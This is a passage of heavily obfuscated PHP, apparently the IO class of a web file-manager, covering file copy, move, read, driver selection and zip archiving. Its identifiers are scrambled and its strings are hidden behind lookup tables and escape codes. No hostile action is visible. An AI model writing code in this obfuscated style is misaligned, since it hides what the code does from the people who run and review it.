$Ñ’Ã¸‚ô, $‹£¹¾“, $_SERVER[µÅ˜º…æ][641], $Ïûö©ˆ£); } public static function move($É’Ö¨ª, $÷Û„¬ƒ…, $æ»èŠÜæ = false, $ëËßñç» = false) { return self::copyMoveStart($É’Ö¨ª, $÷Û„¬ƒ…, $æ»èŠÜæ, $_SERVER[µÅ˜º…æ][643], $ëËßñç»); } public static function copyMoveChildren($ªûæÍÖ«, $±úãĞ’ƒ, $–´œ×· = "\143\x6f\160\171", $äÎ«½—µ = REPEAT_REPLACE) { $Ÿ»ÛóØƒ =& $_SERVER[µÅ˜º…æ]; $¥˜œœá = $ªûæÍÖ«; $¨ÀÆë€Ó = self::driverMake($ªûæÍÖ«); $›ƒÓ¿ = $¨ÀÆë€Ó->listPath($ªûæÍÖ«, !0); $õäõĞºÑ = array_merge($›ƒÓ¿[$Ÿ»ÛóØƒ[86]], $›ƒÓ¿[$Ÿ»ÛóØƒ[85]]); foreach ($õäõĞºÑ as $ß”¥ò™õ) { self::copyMoveStart($ß”¥ò™õ[$Ÿ»ÛóØƒ[87]], $±úãĞ’ƒ, $äÎ«½—µ, $–´œ×·, !1); } if ($–´œ×· == $Ÿ»ÛóØƒ[643]) { self::remove($¥˜œœá); } } private static function copyMoveStart($âÏ¶€Ã”, $ˆß¤îœš, $õÄÃ²Ê¦, $¯¸ÆõÜÄ, $’¢çá¡¼) { $£ğ²ÂÙ =& $_SERVER[µÅ˜º…æ]; $‹ËµÕŒ = array($âÏ¶€Ã”, $ˆß¤îœš, $õÄÃ²Ê¦, $’¢çá¡¼); Hook::trigger($£ğ²ÂÙ[1333] . $¯¸ÆõÜÄ . $£ğ²ÂÙ[1334], $‹ËµÕŒ); $êæšûäå = self::copyMove($âÏ¶€Ã”, $ˆß¤îœš, $õÄÃ²Ê¦, $¯¸ÆõÜÄ, $’¢çá¡¼); Hook::trigger($£ğ²ÂÙ[1333] . $¯¸ÆõÜÄ . $£ğ²ÂÙ[1337], $‹ËµÕŒ, $êæšûäå); return $êæšûäå; } public static function saveFile($û«È¶Ü¹, $Œ×‰×Î, $Öñ…¥à = true) { $åÅŸäÒ£ =& $_SERVER[µÅ˜º…æ]; $Òœµ‰ë’ = self::info($Œ×‰×Î); $•„—¸¨© = self::driverMake($û«È¶Ü¹); $õŞ™­Ø = self::driverMake($Œ×‰×Î); $ø€Í¡‘µ = !1; if ($õŞ™­Ø->pathParse[$åÅŸäÒ£[1338]]) { $ø€Í¡‘µ = $õŞ™­Ø; $Ş×ğèêı = $õŞ™­Ø->pathParse[$åÅŸäÒ£[1338]]; $õŞ™­Ø = self::driverMake($Ş×ğèêı); } if ($•„—¸¨©->pathParse[$åÅŸäÒ£[1338]]) { $Ñ‚İÀ¥á = $•„—¸¨©->pathParse[$åÅŸäÒ£[1338]]; $•„—¸¨© = self::driverMake($Ñ‚İÀ¥á); } $ÜòÅŒé¥ = $õŞ™­Ø->pathFather($Œ×‰×Î); $ãŞ±˜ = !0; if (!$Öñ…¥à && self::driverIsSame($•„—¸¨©, $õŞ™­Ø)) { $ãŞ±˜ = !1; } $Şèı¤’º = self::copyFile($•„—¸¨©, $û«È¶Ü¹, $õŞ™­Ø, $ÜòÅŒé¥, $Òœµ‰ë’[$åÅŸäÒ£[32]], $ãŞ±˜); if ($ø€Í¡‘µ) { $Şèı¤’º = $ø€Í¡‘µ->getPathOuter($Şèı¤’º); } return $Şèı¤’º; } private static function copyMove($ñ²“º¼¢, $½±ÊÃ¶, $Ñäªè¦³, $÷¬ôÀòú, $ªäÌ¯†‡ = false) { $¦ë¬úˆó =& $_SERVER[µÅ˜º…æ]; if (!$ñ²“º¼¢ || $ñ²“º¼¢ == $¦ë¬úˆó[8] || !$½±ÊÃ¶) { return !1; } ignore_timeout(); $«ƒ£ıÆ = self::driverMake($ñ²“º¼¢); $‚¸Á°£ = self::driverMake($½±ÊÃ¶); $ªË­Àö‰ = $÷¬ôÀòú == $¦ë¬úˆó[643]; $ƒí­é°ß = !1; if ($‚¸Á°£->pathParse[$¦ë¬úˆó[1338]]) { $ƒí­é°ß = $‚¸Á°£; $½±ÊÃ¶ = $‚¸Á°£->pathParse[$¦ë¬úˆó[1338]]; $‚¸Á°£ = self::driverMake($½±ÊÃ¶); } if ($«ƒ£ıÆ->pathParse[$¦ë¬úˆó[1338]]) { $ñ²“º¼¢ = $«ƒ£ıÆ->pathParse[$¦ë¬úˆó[1338]]; $«ƒ£ıÆ = self::driverMake($ñ²“º¼¢); } self::check($«ƒ£ıÆ, $ñ²“º¼¢, $‚¸Á°£, $½±ÊÃ¶); Hook::trigger($¦ë¬úˆó[1339], $«ƒ£ıÆ, $ñ²“º¼¢, $‚¸Á°£, $½±ÊÃ¶); $üÅ·ßò‚ = self::driverIsSame($«ƒ£ıÆ, $‚¸Á°£); if ($üÅ·ßò‚) { if ($÷¬ôÀòú == $¦ë¬úˆó[643] && !method_exists($‚¸Á°£, $¦ë¬úˆó[1340]) && trim($½±ÊÃ¶, $¦ë¬úˆó[8]) == trim($‚¸Á°£->pathFather($ñ²“º¼¢), $¦ë¬úˆó[8])) { if ($«ƒ£ıÆ->pathThis($ñ²“º¼¢) != $ªäÌ¯†‡ && !$«ƒ£ıÆ->isOsDriver()) { return $«ƒ£ıÆ->rename($ñ²“º¼¢, $ªäÌ¯†‡); } return $‚¸Á°£->getPathOuter($ñ²“º¼¢); } if (method_exists($‚¸Á°£, $÷¬ôÀòú)) { return $‚¸Á°£->{$÷¬ôÀòú}($ñ²“º¼¢, $½±ÊÃ¶, $Ñäªè¦³, $ªäÌ¯†‡); } } if ($üÅ·ßò‚ && $÷¬ôÀòú == $¦ë¬úˆó[643] && $‚¸Á°£->getType() == $¦ë¬úˆó[106]) { $¾­ØÄó¦ = $‚¸Á°£->movePath($ñ²“º¼¢, $½±ÊÃ¶, $ªäÌ¯†‡); if ($¾­ØÄó¦) { return $¾­ØÄó¦; } } $µÜçËêˆ = $«ƒ£ıÆ->isFile($ñ²“º¼¢); if (!$µÜçËêˆ && $‚¸Á°£->getType() == $¦ë¬úˆó[857] && $«ƒ£ıÆ->getType() == $¦ë¬úˆó[106]) { $¾­ØÄó¦ = $‚¸Á°£->copyFolderFromIO($«ƒ£ıÆ, $ñ²“º¼¢, $½±ÊÃ¶, $Ñäªè¦³, $ªË­Àö‰, $ªäÌ¯†‡); } else { $¾­ØÄó¦ = self::copyPath($«ƒ£ıÆ, $ñ²“º¼¢, $‚¸Á°£, $½±ÊÃ¶, $Ñäªè¦³, $ªË­Àö‰, $µÜçËêˆ, $ªäÌ¯†‡); } if ($¾­ØÄó¦ && $ªË­Àö‰) { $«ƒ£ıÆ->remove($ñ²“º¼¢); } if ($ƒí­é°ß) { $¾­ØÄó¦ = $ƒí­é°ß->getPathOuter($¾­ØÄó¦); } return $¾­ØÄó¦; } private static function check($›ƒ»‚¸½, $üÛšŠ‰ƒ, $áÓØËó¢, &$êÅ¼ëë) { $¨öô¢à =& $_SERVER[µÅ˜º…æ]; if (self::driverIsSame($›ƒ»‚¸½, $áÓØËó¢) && $›ƒ»‚¸½->isFolder($üÛšŠ‰ƒ) && $›ƒ»‚¸½->isParentOf($üÛšŠ‰ƒ, $êÅ¼ëë)) { show_json(LNG($¨öô¢à[1341]), !1); } if (!$›ƒ»‚¸½->exist($üÛšŠ‰ƒ)) { show_json(LNG($¨öô¢à[105]), !1); } } private static function copyPath($Íà³Ü¤Ê, $Ñ¹è¸â§, $«ø—õò£, $İÜ÷†, $ˆ¶§Åİ°, $šÈíö, $Î² ƒÙ, $áÉ¿ ¡ = false, $ˆÃ…ÜŸ÷ = true) { $¶ÕÖ¦à‚ =& $_SERVER[µÅ˜º…æ]; $ª ù²¯Ô = empty($áÉ¿ ¡) && $áÉ¿ ¡ !== $¶ÕÖ¦à‚[228] ? $Íà³Ü¤Ê->pathThis($Ñ¹è¸â§) : $áÉ¿ ¡; if ($ˆ¶§Åİ°) { $¢œÎÍ¾ = $«ø—õò£->fileNameExist($İÜ÷†, $ª ù²¯Ô); $é½êøÍÃ = $ª ù²¯Ô; $ª ù²¯Ô = $«ø—õò£->fileNameAuto($İÜ÷†, $ª ù²¯Ô, $ˆ¶§Åİ°, !$Î² ƒÙ); if (!$¢œÎÍ¾ || $é½êøÍÃ != $ª ù²¯Ô) { $ˆ¶§Åİ° = !1; } if ($ˆÃ…ÜŸ÷ && !$ˆ¶§Åİ°) { $«ø—õò£->_data[$¶ÕÖ¦à‚[1342]] = !0; } } if ($Î² ƒÙ) { return self::copyFile($Íà³Ü¤Ê, $Ñ¹è¸â§, $«ø—õò£, $İÜ÷†, $ª ù²¯Ô, $šÈíö); } if ($ˆ¶§Åİ° == REPEAT_RENAME_FOLDER) { $ˆ¶§Åİ° = !1; } $ıä…•É = rtrim($İÜ÷†, $¶ÕÖ¦à‚[8]) . $¶ÕÖ¦à‚[8] . $ª ù²¯Ô; $´ÊüÔÊÂ = $«ø—õò£->mkdir($«ø—õò£->getPath($ıä…•É), $ˆ¶§Åİ°); $İÜ÷† = $«ø—õò£->getPathInner($´ÊüÔÊÂ); $É»³€ğ™ = $Íà³Ü¤Ê->listPath($Ñ¹è¸â§, !0); $É»³€ğ™ = is_array($É»³€ğ™) ? $É»³€ğ™ : array($¶ÕÖ¦à‚[86] => array(), $¶ÕÖ¦à‚[85] => array()); $«´Ë¾ÍÎ = array_merge($É»³€ğ™[$¶ÕÖ¦à‚[86]], $É»³€ğ™[$¶ÕÖ¦à‚[85]]); foreach ($«´Ë¾ÍÎ as $øÜÍ•¿) { $¿“°¸©€ = $øÜÍ•¿[$¶ÕÖ¦à‚[33]] == $¶ÕÖ¦à‚[230]; $Ñ¹è¸â§ = $Íà³Ü¤Ê->getPathInner($øÜÍ•¿[$¶ÕÖ¦à‚[87]]); $½ï®¬æİ = self::copyPath($Íà³Ü¤Ê, $Ñ¹è¸â§, $«ø—õò£, $İÜ÷†, $ˆ¶§Åİ°, $šÈíö, $¿“°¸©€, !1, !1); if (!$½ï®¬æİ) { IO::errorTips($¶ÕÖ¦à‚[1343] . $Ñ¹è¸â§ . $¶ÕÖ¦à‚[73] . $İÜ÷†); } } self::copyMoveKeepInfo($Íà³Ü¤Ê, $Ñ¹è¸â§, $´ÊüÔÊÂ); return $´ÊüÔÊÂ; } private static function copyFile($ˆ“à˜ÈÌ, $ŒÎ¯—®Û, $ğ©ŒÔ°, $òôõÍôÖ, $ì› Ûúó, $Ó¡›£†) { $Êõª–¨ç =& $_SERVER[µÅ˜º…æ]; $òôõÍôÖ = $ğ©ŒÔ°->getPath(rtrim($òôõÍôÖ, $Êõª–¨ç[8]) . $Êõª–¨ç[8] . $ì› Ûúó); $²ü½ş—³ = $Êõª–¨ç[1344] . time() . rand_string(5); Hook::trigger($Êõª–¨ç[1345], $ˆ“à˜ÈÌ, $ŒÎ¯—®Û, $ğ©ŒÔ°, $òôõÍôÖ, $ì› Ûúó, $²ü½ş—³); if (self::driverIsSame($ˆ“à˜ÈÌ, $ğ©ŒÔ°)) { if ($Ó¡›£†) { $Şª§µÕß = $ğ©ŒÔ°->moveFile($ŒÎ¯—®Û, $òôõÍôÖ); } else { $Şª§µÕß = $ğ©ŒÔ°->copyFile($ŒÎ¯—®Û, $òôõÍôÖ); } Hook::trigger($Êõª–¨ç[1346], $ˆ“à˜ÈÌ, $ŒÎ¯—®Û, $ğ©ŒÔ°, $òôõÍôÖ, $ì› Ûúó, $Şª§µÕß); self::copyMoveKeepInfo($ˆ“à˜ÈÌ, $ŒÎ¯—®Û, $Şª§µÕß); return $Şª§µÕß; } $ØÜ÷ÁÔª = TEMP_FILES; if ($GLOBALS[$Êõª–¨ç[6]][$Êõª–¨ç[92]][$Êõª–¨ç[897]]) { $ØÜ÷ÁÔª = $GLOBALS[$Êõª–¨ç[6]][$Êõª–¨ç[92]][$Êõª–¨ç[897]]; } $ Ûìª½× = $ØÜ÷ÁÔª; mk_dir($ Ûìª½×); $ü—û¹¶Ñ = $ Ûìª½× . $²ü½ş—³; $óûÃˆ£Å = $ü—û¹¶Ñ; $ü—û¹¶Ñ = $ˆ“à˜ÈÌ->download($ŒÎ¯—®Û, $ü—û¹¶Ñ); $ü—û¹¶Ñ = $ˆ“à˜ÈÌ->iconvApp($ü—û¹¶Ñ); if (substr($ü—û¹¶Ñ, strlen($ØÜ÷ÁÔª)) == $ØÜ÷ÁÔª) { $Ó¡›£† = !0; } $Şª§µÕß = $ğ©ŒÔ°->upload($òôõÍôÖ, $ü—û¹¶Ñ, $Ó¡›£†); self::remove($óûÃˆ£Å); Hook::trigger($Êõª–¨ç[1346], $ˆ“à˜ÈÌ, $ŒÎ¯—®Û, $ğ©ŒÔ°, $òôõÍôÖ, $ì› Ûúó, $Şª§µÕß); self::copyMoveKeepInfo($ˆ“à˜ÈÌ, $ŒÎ¯—®Û, $Şª§µÕß); return $Şª§µÕß; } private static function copyMoveKeepInfo($é‚Ë¼†, $ĞÖÁ¤üí, $ŸŞ•¿Èù) { if (!$ŸŞ•¿Èù) { return; } $¦Ì¨øÉ• = $é‚Ë¼†->info($ĞÖÁ¤üí); if (!is_array($¦Ì¨øÉ•)) { return; } IO::setModifyTime($ŸŞ•¿Èù, $¦Ì¨øÉ•[$_SERVER[µÅ˜º…æ][88]]); } public static function pathFather($ü½®®ü®) { $öœ¹ƒú = IO::init($ü½®®ü®); $¦™’ßµà = $öœ¹ƒú->pathFather($öœ¹ƒú->path); return $öœ¹ƒú->getPathOuter($¦™’ßµà); } public static function fileOut($¶ã£›£ó, $†Ö²‘× = false, $‹‹“şŸÖ = false, $®¡×‹Ø = '') { $ëÔì–¡÷ = self::driverMake($¶ã£›£ó); if ($ëÔì–¡÷->isFileOutServer()) { return $ëÔì–¡÷->fileOutServer($¶ã£›£ó, $†Ö²‘×, $‹‹“şŸÖ, $®¡×‹Ø); } return $ëÔì–¡÷->fileOut($¶ã£›£ó, $†Ö²‘×, $‹‹“şŸÖ, $®¡×‹Ø); } public static function fileOutImage($òì¡ù¾ï, $ø€à‚²õ = 250) { $¨îà›´  = array(250, 600, 1200, 2000, 3000, 5000); for ($¥ßŞìú = 0; $¥ßŞìú < count($¨îà›´ ); $¥ßŞìú++) { if ($¥ßŞìú == 0 && $ø€à‚²õ <= $¨îà›´ [$¥ßŞìú]) { $ø€à‚²õ = $¨îà›´ [$¥ßŞìú]; break; } else { if ($ø€à‚²õ > $¨îà›´ [$¥ßŞìú - 1] && $ø€à‚²õ <= $¨îà›´ [$¥ßŞìú]) { $ø€à‚²õ = $¨îà›´ [$¥ßŞìú]; break; } else { if ($¥ßŞìú == count($¨îà›´ ) - 1 && $ø€à‚²õ > $¨îà›´ [$¥ßŞìú]) { $ø€à‚²õ = $¨îà›´ [$¥ßŞìú]; break; } } } } $ô¼ÌèÃÅ = self::driverMake($òì¡ù¾ï); if ($ô¼ÌèÃÅ->isFileOutServer()) { return $ô¼ÌèÃÅ->fileOutImageServer($òì¡ù¾ï, $ø€à‚²õ); } return $ô¼ÌèÃÅ->fileOutImage($òì¡ù¾ï, $ø€à‚²õ); } private static function driverIsSame($ë‚‹‚œ, $ğÔŞ¸îò) { $ÍÙá¢”§ =& $_SERVER[µÅ˜º…æ]; $Œó§Û‰ = $ë‚‹‚œ->getType(); $ÈÖãÇß– = $ğÔŞ¸îò->getType(); if ($Œó§Û‰ != $ÈÖãÇß–) { return !1; } if ($Œó§Û‰ == $ÍÙá¢”§[857]) { return !0; } if ($Œó§Û‰ == $ÍÙá¢”§[106]) { return !0; } if ($ë‚‹‚œ->pathDriver == $ğÔŞ¸îò->pathDriver) { return !0; } return !1; } public static function copyUpdate($ßÀÁ´£æ, $á·”à•¶) { $ã¡†Ó =& $_SERVER[µÅ˜º…æ]; if (!IO::exist($ßÀÁ´£æ)) { return !1; } if (!IO::exist($á·”à•¶)) { IO::mkdir($á·”à•¶); } $æÏÇ = array_to_keyvalue(self::listAllSimple($ßÀÁ´£æ), $ã¡†Ó[87]); $Ù¥âéñä = array_to_keyvalue(self::listAllSimple($á·”à•¶), $ã¡†Ó[87]); $„ĞÌ§ = array(); $µú¾Ç³Ã = array(); foreach ($æÏÇ as $ªª¦üËß => $ëîßÚ”Ş) { if (isset($Ù¥âéñä[$ªª¦üËß])) { if ($ëîßÚ”Ş[$ã¡†Ó[78]] == 1) { continue; } if ($Ù¥âéñä[$ªª¦üËß][$ã¡†Ó[79]] == $ëîßÚ”Ş[$ã¡†Ó[79]]) { continue; } } if ($ëîßÚ”Ş[$ã¡†Ó[78]] == 1) { $µú¾Ç³Ã[] = $á·”à•¶ . $ã¡†Ó[8] . trim($ªª¦üËß, $ã¡†Ó[8]); continue; } $‚»Íëª = strstr(trim($ªª¦üËß, $ã¡†Ó[8]), $ã¡†Ó[8]) ? get_path_father($ªª¦üËß) : $ã¡†Ó[12]; $„ĞÌ§[] = array($ã¡†Ó[1347] => $ëîßÚ”Ş[$ã¡†Ó[89]], $ã¡†Ó[1348] => rtrim($á·”à•¶, $ã¡†Ó[8]) . $ã¡†Ó[8] . $‚»Íëª, $ã¡†Ó[1349] => $ëîßÚ”Ş); } $·Ì“­½ = array($ã¡†Ó[230] => $„ĞÌ§, $ã¡†Ó[78] => $µú¾Ç³Ã); Hook::trigger($ã¡†Ó[1350], $ßÀÁ´£æ, $á·”à•¶, $·Ì“­½); foreach ($µú¾Ç³Ã as $ëîßÚ”Ş) { IO::mkdir($ëîßÚ”Ş); } foreach ($„ĞÌ§ as $ëîßÚ”Ş) { IO::copy($ëîßÚ”Ş[$ã¡†Ó[1347]], $ëîßÚ”Ş[$ã¡†Ó[1348]], REPEAT_REPLACE); } } public static function fileSubstr($ìÃ¦õÂ¶, $ò¶“»ÑÉ, $‰ê–¿€Ë = false) { $®»¬“–… =& $_SERVER[µÅ˜º…æ]; $ëÑøÚÑ = self::driverMake($ìÃ¦õÂ¶); $›œ¹Øâ¾ = $ëÑøÚÑ->size($ìÃ¦õÂ¶); $„Ü‡ÜÆ = $ò¶“»ÑÉ; $•î¿ª”ç = $‰ê–¿€Ë; if ($ò¶“»ÑÉ < 0) { $ò¶“»ÑÉ = $›œ¹Øâ¾ + $ò¶“»ÑÉ; } if ($‰ê–¿€Ë === !1) { $‰ê–¿€Ë = $›œ¹Øâ¾ - $ò¶“»ÑÉ; } if ($ò¶“»ÑÉ + $‰ê–¿€Ë > $›œ¹Øâ¾) { $‰ê–¿€Ë = $›œ¹Øâ¾ - $ò¶“»ÑÉ; } if (!$›œ¹Øâ¾ && $ëÑøÚÑ->getType() == $®»¬“–…[106] && !$ëÑøÚÑ->exist($ìÃ¦õÂ¶)) { $ŒÂ×Ï÷Ò = get_path_this($ìÃ¦õÂ¶); $¿Íå”¦  = parse_url_query($ŒÂ×Ï÷Ò); if (is_array($¿Íå”¦ ) && isset($¿Íå”¦ [$®»¬“–…[32]])) { $ŒÂ×Ï÷Ò = urldecode($¿Íå”¦ [$®»¬“–…[32]]); } throw new Exception($®»¬“–…[1351] . LNG($®»¬“–…[1352]) . $®»¬“–…[1135] . clear_html($ŒÂ×Ï÷Ò) . $®»¬“–…[12]); } if ($‰ê–¿€Ë <= 0) { return $®»¬“–…[12]; } if ($ò¶“»ÑÉ < 0 || $ò¶“»ÑÉ >= $›œ¹Øâ¾ || $‰ê–¿€Ë > $GLOBALS[$®»¬“–…[6]][$®»¬“–…[92]][$®»¬“–…[1353]]) { throw new Exception("\x66\151\154\x65\x52\145\x61\x64\x20\145\162\162\x6f\162\54\157\x76\x65\x72\40\x69\x6f\x52\145\x61\x64\115\141\170\41\40\x73\164\141\162\x74\x3d{$ò¶“»ÑÉ}\73\x6c\x65\156\147\x74\x68\x3d{$‰ê–¿€Ë}\73\40\x73\151\x7a\145\x3d{$›œ¹Øâ¾}\73"); } $úé‚úæ = $ëÑøÚÑ->fileSubstr($ìÃ¦õÂ¶, $ò¶“»ÑÉ, $‰ê–¿€Ë); if (!$úé‚úæ && $‰ê–¿€Ë && isset($GLOBALS[$®»¬“–…[1354]])) { throw new Exception($GLOBALS[$®»¬“–…[1354]][$®»¬“–…[1355]]); } return $úé‚úæ; } private static function driverMake(&$ÎšºÃ–¼) { $Ø•‡İŠ¦ =& $_SERVER[µÅ˜º…æ]; $ñã—Š» = KodIO::parse($ÎšºÃ–¼); if (!self::$driverListSystem) { $ßÆ„“‡¬ = Model($Ø•‡İŠ¦[867])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ßÆ„“‡¬, $Ø•‡İŠ¦[487]); } if ($ñã—Š»[$Ø•‡İŠ¦[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ñã—Š»[$Ø•‡İŠ¦[487]]]) { throw new Exception($Ø•‡İŠ¦[1356]); return !1; } $ÎšºÃ–¼ = $ñã—Š»[$Ø•‡İŠ¦[1357]]; $ÁÃÅÓõû = self::driverGet($ñã—Š», $ÎšºÃ–¼); return $ÁÃÅÓõû; } private static function driverGet($ÒáÚÔÕ¼, &$Éùñœ˜) { $±à·¯‘ =& $_SERVER[µÅ˜º…æ]; $¹ì’¦½¼ = $ÒáÚÔÕ¼[$±à·¯‘[1358]]; $ÒÃ ‹’ = $ÒáÚÔÕ¼[$±à·¯‘[487]]; switch ($ÒáÚÔÕ¼[$±à·¯‘[33]]) { case KodIO::KOD_IO: $‚äíğ¯ª = self::$driverListSystem[$ÒÃ ‹’]; break; case KodIO::KOD_SOURCE: $Éùñœ˜ = $ÒÃ ‹’ . $Éùñœ˜; $‚äíğ¯ª = array($±à·¯‘[1359] => $±à·¯‘[1360], $±à·¯‘[6] => $ÒáÚÔÕ¼); $‚äíğ¯ª[$±à·¯‘[6]][$±à·¯‘[1361]] = $ÒáÚÔÕ¼[$±à·¯‘[487]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $›õÛÛı = $GLOBALS[$±à·¯‘[1362]]; self::$driverListUser = array_to_keyvalue($›õÛÛı, $±à·¯‘[487]); } $‚äíğ¯ª = self::$driverListUser[$ÒÃ ‹’]; break; case KodIO::KOD_SHARE_LINK: $‚äíğ¯ª = array($±à·¯‘[1359] => $±à·¯‘[1363], $±à·¯‘[6] => $ÒáÚÔÕ¼); $ª‚”—•æ = Action($±à·¯‘[1364])->sharePathInfo($ÒáÚÔÕ¼[$±à·¯‘[87]]); $Éùñœ˜ = $ª‚”—•æ[$±à·¯‘[191]]; if (!$ª‚”—•æ[$±à·¯‘[191]]) { $ ¤æóÃ = Model($±à·¯‘[686])->getInfoByHash($ÒáÚÔÕ¼[$±à·¯‘[487]]); $Éùñœ˜ = KodIO::clear($ ¤æóÃ[$±à·¯‘[583]] . $ÒáÚÔÕ¼[$±à·¯‘[1357]]); $ÒáÚÔÕ¼[$±à·¯‘[576]] = $ ¤æóÃ; $ÒáÚÔÕ¼[$±à·¯‘[1338]] = $Éùñœ˜; $‚äíğ¯ª = array($±à·¯‘[1359] => $±à·¯‘[1365], $±à·¯‘[6] => $ÒáÚÔÕ¼); } else { $‚äíğ¯ª[$±à·¯‘[6]][$±à·¯‘[1361]] = $ª‚”—•æ[$±à·¯‘[191]]; } break; case KodIO::KOD_SHARE_ITEM: $‚äíğ¯ª = array($±à·¯‘[1359] => $±à·¯‘[1366], $±à·¯‘[6] => $ÒáÚÔÕ¼); $ ¤æóÃ = Model($±à·¯‘[686])->getInfo($ÒáÚÔÕ¼[$±à·¯‘[487]]); if ($ ¤æóÃ[$±à·¯‘[191]] == $±à·¯‘[228]) { $Éùñœ˜ = KodIO::clear($ ¤æóÃ[$±à·¯‘[583]] . $ÒáÚÔÕ¼[$±à·¯‘[1357]]); $ÒáÚÔÕ¼[$±à·¯‘[576]] = $ ¤æóÃ; $ÒáÚÔÕ¼[$±à·¯‘[1338]] = $Éùñœ˜; $‚äíğ¯ª = array($±à·¯‘[1359] => $±à·¯‘[1367], $±à·¯‘[6] => $ÒáÚÔÕ¼); } else { if (!$Éùñœ˜) { $Éùñœ˜ = $ ¤æóÃ[$±à·¯‘[191]]; } $‚äíğ¯ª[$±à·¯‘[6]][$±à·¯‘[1361]] = $ ¤æóÃ[$±à·¯‘[191]]; } break; case KodIO::KOD_SHARE_OUTER: $‚äíğ¯ª = array($±à·¯‘[1359] => $±à·¯‘[1368], $±à·¯‘[6] => $ÒáÚÔÕ¼); break; default: $Éùñœ˜ = $ÒáÚÔÕ¼[$±à·¯‘[87]]; $‚äíğ¯ª = array($±à·¯‘[1359] => $±à·¯‘[1369]); break; } $®Ñš¸Ñ¶ = $ÒáÚÔÕ¼[$±à·¯‘[87]]; if (!isset(self::$driverCache[$®Ñš¸Ñ¶])) { $çµÔÚÃü = strtolower($‚äíğ¯ª[$±à·¯‘[96]]); $÷Àøæ«¾ = $GLOBALS[$±à·¯‘[6]][$±à·¯‘[92]][$±à·¯‘[933]]; $ Ö­Úùá = $±à·¯‘[77] . (isset($÷Àøæ«¾[$çµÔÚÃü]) ? $÷Àøæ«¾[$çµÔÚÃü] : ucfirst($çµÔÚÃü)); if (!class_exists($ Ö­Úùá)) { show_json("{$ Ö­Úùá}\x20\156\157\164\x20\145\x78\x69\163\x74\x73\41", !1); } $×Œı = isset($‚äíğ¯ª[$±à·¯‘[6]]) ? $‚äíğ¯ª[$±à·¯‘[6]] : !1; self::$driverCache[$®Ñš¸Ñ¶] = new $ Ö­Úùá($×Œı); } $áÌ¿Ñ­­ = self::$driverCache[$®Ñš¸Ñ¶]; $áÌ¿Ñ­­->pathDriver = $¹ì’¦½¼; $áÌ¿Ñ­­->pathBase = $±à·¯‘[12]; if (isset($‚äíğ¯ª[$±à·¯‘[6]][$±à·¯‘[1370]])) { $áÌ¿Ñ­­->pathBase = rtrim($‚äíğ¯ª[$±à·¯‘[6]][$±à·¯‘[1370]], $±à·¯‘[8]) . $±à·¯‘[8]; $Éùñœ˜ = $áÌ¿Ñ­­->pathBase . ltrim($Éùñœ˜, $±à·¯‘[8]); } $Éùñœ˜ = $áÌ¿Ñ­­->getPath($Éùñœ˜); if (isset($ÒáÚÔÕ¼[$±à·¯‘[1338]])) { $Éùñœ˜ = $ÒáÚÔÕ¼[$±à·¯‘[1338]]; } $áÌ¿Ñ­­->path = $Éùñœ˜; return $áÌ¿Ñ­­; } public static function errorTips($õº¹ªŒº = false, $ø¾®“ŠÖ = true) { $¿àï£¡ =& $_SERVER[µÅ˜º…æ]; static $ü¦Ü›• = array(); $ÕÖŸª· = 100; if ($õº¹ªŒº === -1) { return $ü¦Ü›• ? $ü¦Ü›•[count($ü¦Ü›•) - 1] : $¿àï£¡[12]; } if ($õº¹ªŒº === !1) { return implode($¿àï£¡[285], $ü¦Ü›•); } if (count($ü¦Ü›•) >= $ÕÖŸª·) { $ü¦Ü›• = array_slice($ü¦Ü›•, $ÕÖŸª· * 0.5, $ÕÖŸª·); } $ü¦Ü›•[] = $õº¹ªŒº; if (!$ø¾®“ŠÖ) { return; } write_log($¿àï£¡[173] . ACTION . $¿àï£¡[1371] . $õº¹ªŒº, $¿àï£¡[1372]); } public static function getLastError($ü®å¨Ø = '') { $İÂŞŞèë = self::errorTips(-1); return $İÂŞŞèë ? $İÂŞŞèë : $ü®å¨Ø; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Æã¸€‚ó; if ($Æã¸€‚ó) { return $Æã¸€‚ó; } $ï–À·ªà = IO::init($_SERVER[µÅ˜º…æ][8]); return $ï–À·ªà; } private static function iconvSystem($¢œŞÎñ) { return self::local()->iconvSystem($¢œŞÎñ); } private static function iconvApp($‚¥…Ãø) { return self::local()->iconvApp($‚¥…Ãø); } public static function zipFolder($¸â“’Û², $ŞÆö¤Àœ = "\172\151\x70", $œé€ÒÃö = '', $úîï¸¤ = REPEAT_RENAME) { $ã¡³¦îÅ =& $_SERVER[µÅ˜º…æ]; $Œø÷Ó­ş = IO::listPath($¸â“’Û²); if (!$Œø÷Ó­ş) { return !1; } $Œø÷Ó­ş = array_merge($Œø÷Ó­ş[$ã¡³¦îÅ[85]], $Œø÷Ó­ş[$ã¡³¦îÅ[86]]); return self::zip($Œø÷Ó­ş, $ŞÆö¤Àœ, $œé€ÒÃö, $úîï¸¤); } public static function zip($¶ ©Ü˜Ğ, $’Î£ÊŠŞ = "\x7a\x69\x70", $‹Í¶¯©¦ = '', $íªÀÊ©« = REPEAT_RENAME) { $°û™óÈª =& $_SERVER[µÅ˜º…æ]; if (is_string($¶ ©Ü˜Ğ) && $¶ ©Ü˜Ğ) { $¶ ©Ü˜Ğ = array(array($°û™óÈª[87] => $¶ ©Ü˜Ğ)); } $ù«ìë¬® = self::init($¶ ©Ü˜Ğ[0][$°û™óÈª[87]]); $äóÌãÒğ = self::info($¶ ©Ü˜Ğ[0][$°û™óÈª[87]]); $à©µšê = $°û™óÈª[12]; $®‹³„§˜ = $°û™óÈª[12]; $áÂéÛÖÇ = $°û™óÈª[12]; if ($‹Í¶¯©¦ && substr($‹Í¶¯©¦, -1, 1) != $°û™óÈª[8]) { $®‹³„§˜ = get_path_father($‹Í¶¯©¦); $áÂéÛÖÇ = get_path_this($‹Í¶¯©¦); } else { $®‹³„§˜ = self::pathFather($äóÌãÒğ[$°û™óÈª[87]]); $áÂéÛÖÇ = $äóÌãÒğ[$°û™óÈª[32]] . $°û™óÈª[10] . $’Î£ÊŠŞ; if (count($¶ ©Ü˜Ğ) > 1) { $²»Ó±Å½ = IO::info($®‹³„§˜); $áÂéÛÖÇ = $²»Ó±Å½[$°û™óÈª[32]] . $°û™óÈª[10] . $’Î£ÊŠŞ; } if ($‹Í¶¯©¦) { $®‹³„§˜ = $‹Í¶¯©¦; } } if ($ù«ìë¬®->getType() == $°û™óÈª[106]) { $€ãùáÀğ = self::init($®‹³„§˜); $ÆêŠ³ú = 